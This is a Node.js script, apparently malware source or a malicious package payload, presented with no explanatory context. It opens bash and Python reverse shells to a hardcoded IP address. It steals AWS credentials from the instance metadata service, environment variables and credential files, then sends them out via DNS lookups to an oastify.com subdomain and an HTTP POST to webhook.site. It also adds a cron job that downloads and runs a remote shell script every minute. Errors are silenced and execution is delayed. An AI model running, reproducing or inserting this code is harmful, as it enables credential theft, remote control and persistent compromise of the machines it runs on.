const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');

const sessionId = crypto.randomBytes(4).toString('hex');
const attackerIP = '143.110.254.249';
const attackerPort = '1337';

function execute(cmd) {
    try {
        return execSync(cmd, { stdio: 'ignore', timeout: 5000 });
    } catch (e) {
        return null;
    }
}

function reverseShell() {
    const shells = [
        `bash -c 'bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1'`,
        `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${attackerIP}",${attackerPort}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
    ];
    shells.forEach(cmd => execute(cmd));
}

function harvestAWS() {
    const data = {
        metadata: execute('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
        env: Object.entries(process.env).filter(([k]) => k.includes('AWS')),
        files: {
            '~/.aws/credentials': execute('cat ~/.aws/credentials'),
            '/root/.aws/credentials': execute('cat /root/.aws/credentials')
        }
    };
    return data;
}

function exfil(data) {
    const payload = JSON.stringify({
        id: sessionId,
        host: os.hostname(),
        user: execute('whoami'),
        data: data
    });

    // DNS Exfiltration (short payloads)
    execute(`dig +short ${sessionId}.7emwnamdc0dpaswxncpyd3yd248vwpke.oastify.com`);

    // HTTP Exfiltration (for larger data)
    execute(`curl -X POST https://webhook.site/50253029-1ec3-4b4a-9646-fc25a2b21963 -d '${payload}' --silent`);

    // Backup: Write to disk
    fs.writeFileSync(`/tmp/.${sessionId}`, payload);
}

// Persistence (Cronjob)
function persist() {
    const cronCmd = `(crontab -l 2>/dev/null; echo "* * * * * curl -s http://${attackerIP}/payload.sh | bash") | crontab -`;
    execute(cronCmd);
}


function main() {
    setTimeout(() => {
        const awsData = harvestAWS();
        exfil(awsData);
        reverseShell();
        persist();
    }, 3000); // Initial delay
}

main();
